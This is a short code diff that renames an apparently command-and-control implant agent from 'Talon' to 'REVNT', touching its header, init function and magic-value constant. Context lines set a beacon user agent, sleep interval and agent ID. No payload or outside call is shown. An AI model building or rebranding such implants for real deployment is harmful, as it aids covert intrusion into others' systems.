@@ -1,11 +1,11 @@
-#include <Talon.h>
+#include <REVNT.h>
 
 #include <Core.h>
 #include <Config.h>
 #include <Package.h>
 #include <Command.h>
 
-VOID TalonInit()
+VOID RevntInit()
 {
     // Init Connection info
     Instance.Config.Transport.UserAgent = CONFIG_USER_AGENT;
@@ -21,7 +21,7 @@ VOID TalonInit()
     Instance.Config.Sleeping = CONFIG_SLEEP;
 
     printf( "AgentID     => %x\n", Instance.Session.AgentID );
-    printf( "Magic Value => %x\n", TALON_MAGIC_VALUE );
+    printf( "Magic Value => %x\n", REVNT_MAGIC_VALUE );
 }
 
 VOID AnonPipeRead( HANDLE hSTD_OUT_Read )
